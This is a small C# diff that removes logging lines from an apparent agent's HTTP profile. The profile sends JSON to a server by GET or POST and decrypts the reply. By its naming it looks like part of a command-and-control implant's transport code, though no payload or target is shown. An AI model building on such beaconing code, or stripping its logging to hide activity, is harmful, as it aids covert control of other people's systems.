@@ -178,17 +178,12 @@ namespace Agent.Profiles
 
                 if (json.Length < 2000) //Max URL length
                 {
-                    logger.Log($"Sending as GET");
                     response = await this._client.GetAsync(this.getURL + json.Replace('+', '-').Replace('/', '_'), cancellationTokenSource.Token);
                 }
                 else
                 {
-                    logger.Log($"Sending as POST");
                     response = await this._client.PostAsync(this.postURL, new StringContent(json), cancellationTokenSource.Token);
                 }
-
-                logger.Log($"Got Response with code: {response.StatusCode}");
-
                 string strRes = await response.Content.ReadAsStringAsync();
                 //This will decrypt and remove the UUID if AES is referenced, or just remove the UUID if None is referenced.
                 return this.crypt.Decrypt(strRes);
